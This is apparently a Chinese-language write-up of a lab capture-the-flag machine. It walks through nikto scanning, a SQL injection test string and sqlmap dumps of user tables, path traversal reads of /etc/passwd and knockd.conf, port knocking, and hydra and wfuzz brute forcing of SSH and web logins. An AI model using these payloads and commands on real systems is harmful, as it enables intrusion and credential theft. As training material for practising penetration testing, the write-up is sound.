
### 1.主机发现

> ip:192.168.92.193

### 2.端口扫描

> ![image-20211020191230451](https://tva1.sinaimg.cn/large/008i3skNly1gvlzmoegoij60p809y3zs02.jpg)
>
> 80端口是打开的

### 3.访问http://192.168.92.193/

> 目录扫描
>
> ```
> nikto -host 192.168.92.193
>
> ```

![image-20211020191313150](https://tva1.sinaimg.cn/large/008i3skNgy1gvlznd3kn1j60pw0fzab502.jpg)

### 4.可以SQL注入

> 判断是否有注入
>
> `' or 1=1 --+`
>
> 使用sqlmap注入
>
> ```
> 1.查看是否有注入
> sqlmap -u http://192.168.92.193/results.php --data 'search=1'  
>
> 2.查看数据库
> sqlmap -u http://192.168.92.193/results.php --data 'search=1'  --dbs
>
> 3.查看数据库的数据表
>  sqlmap -u http://192.168.92.193/results.php --data 'search=1'  -D users --tables
>
> 4.打开表
> sqlmap -u http://192.168.92.193/results.php --data 'search=1'  -D users -T  UserDetails --dump
>
>
>
> ```

#### 数据库

![image-20211020191704860](https://tva1.sinaimg.cn/large/008i3skNgy1gvlzrdf8trj609q04k0ss02.jpg)

#### users数据库

![image-20211020191717942](https://tva1.sinaimg.cn/large/008i3skNgy1gvlzrlijt3j606o05cmx302.jpg)

<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gvlzrumtz3j60vq0ksq7802.jpg" alt="image-20211020191732617"  />

> +----+------------+---------------+---------------------+-----------+-----------+
> | id | lastname   | password      | reg_date            | username  | firstname |
> +----+------------+---------------+---------------------+-----------+-----------+
> | 1  | Moe          | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
> | 2  | Dooley      | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
> | 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
> | 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
> | 5  | Cat           | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
> | 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
> | 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
> | 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
> | 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
> | 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
> | 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
> | 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
> | 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
> | 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
> | 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
> | 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
> | 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
> +----+------------+---------------+---------------------+-----------+-----------+

### Staff数据库

`sqlmap -u http://192.168.92.193/results.php --data 'search=1'  -D Staff -T Users --dump`

![image-20211020201108174](https://tva1.sinaimg.cn/large/008i3skNly1gvm1bm6s36j60so04gdg902.jpg)

> 密码
>
> 856f5de590ef37314e7c3bdf6f8a66dc
>
> 明文
>
> transorbital1

### 登录用户

![image-20211020210925948](https://tva1.sinaimg.cn/large/008i3skNgy1gvm309tv7ij60gh0b43z502.jpg)

> FUZZ  查找参数
>
> ` wfuzz -b 'PHPSESSID=p4d8u6edvm3mts5m88qsui02qj' -w /usr/share/wfuzz/wordlist/general/common.txt  http://192.168.92.193/manage.php?FUZZ=index.php`
>
> 没有发现响应不同的 可能是后面参数不对
>
> 访问一个 Linux一定存在的文件 ../../../../../etc/passwd
>
> `wfuzz -b 'PHPSESSID=p4d8u6edvm3mts5m88qsui02qj' -w /usr/share/wfuzz/wordlist/general/common.txt --hw 100   http://192.168.92.193/manage.php?FUZZ=../../../../../etc/passwd`
>
> ![image-20211020211536878](https://tva1.sinaimg.cn/large/008i3skNgy1gvm36pobilj60t006kmxj02.jpg)

### 收集隐私

> http://192.168.92.193/manage.php?file=../../../../etc/passwd
>
> ![image-20211020212527307](https://tva1.sinaimg.cn/large/008i3skNly1gvm3gy9ldtj60oo0bdwio02.jpg)
>
> 发现和数据库中的内容相似

## 使用hydra 爆破ssh

> ```
>  hydra -L name_dis -P paswd_dis 192.168.92.193 ssh
>  
>   hydra -L [用户名字典] -P [密码字典] 192.168.92.193 ssh
>  
> ```
>
> ### 无法爆破  22端口为过滤状态
>
> ![image-20211020213532942](https://tva1.sinaimg.cn/large/008i3skNgy1gvm3rgq3j7j60tg0ak0u502.jpg)
>
>> 22端口可能配置了knock d
>>
>> Knockd 配置文件在  	/etc/knockd.conf
>>
>
> #### 用文件包含查看
>
> `http://192.168.92.193/manage.php?file=../../../../etc/knockd.conf`
>
> ```
> File does not exist
> [options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn
> ```
>
> ### 用nmap 依次访问 7469,8475,9842
>
> ```
>  nmap -p 7469 192.168.17.193
>  nmap -p 8475 192.168.17.193
>  nmap -p 9842 192.168.17.193
>  
>  
>  
> ```
>
> #### 或者用nc
>
> ```
> for x in 7469 8475 9842 22 ;do nc 192.168.92.193 $x;done
> ```
>
> ##### 成功
>
> ![image-20211020214317128](https://tva1.sinaimg.cn/large/008i3skNgy1gvm3zij4rsj614c0dwdia02.jpg)
>
> #### 再次使用hydra继续爆破ssh
>
> ![image-20211020215120403](https://tva1.sinaimg.cn/large/008i3skNly1gvm47vn8cxj60gg02dt9c02.jpg)
>
>> [22][ssh] host: 192.168.92.193   login: chandlerb   password: UrAG0D!
>> [22][ssh] host: 192.168.92.193   login: joeyt   password: Passw0rd
>> [22][ssh] host: 192.168.92.193   login: janitor   password: Ilovepeepee
>>
>
> ### 收集信息
>
> ```
> ls -a
> sudo -l //查看root权限
> history //查看历史命令
> ```
>
>> 发现janitor 有敏感文件
>>
>
> ![image-20211020220121024](https://tva1.sinaimg.cn/large/008i3skNly1gvm4iawghpj30wa06o3yw.jpg)
>
> ```
> 六个密码
> BamBam01
> Passw0rd
> smellycats
> P0Lic#10-4
> B4-Tru3-001
> 4uGU5T-NiGHts
>
> ```
>
> ##### 用hydra发现其他用户
>
> `hydra -L name_dis -P paswd_dis_2 192.168.92.193 ssh`
>
> ![image-20211020220454499](https://tva1.sinaimg.cn/large/008i3skNgy1gvm4m0ds9jj60tc026t8x02.jpg)
>
> 登录fredf
>
> 发现用root 运行文件
>
> ![image-20211020220716510](https://tva1.sinaimg.cn/large/008i3skNly1gvm4ogt1m0j60k201wt8s02.jpg)

### FUZZ 爆破网站密码

```
使用fuzz爆破密码

 wfuzz  -z file,name_dis -z file,paswd_dis -d "username=FUZZ&password=FUZ2Z"   http://192.168.92.193/manage.php

//wufzz -z file,[字典file] -z file,[字典file] -d"[post请求内容]" http://URL****


```

![image-20211020200115743](https://tva1.sinaimg.cn/large/008i3skNly1gvm11cqognj60zk0hidja02.jpg)
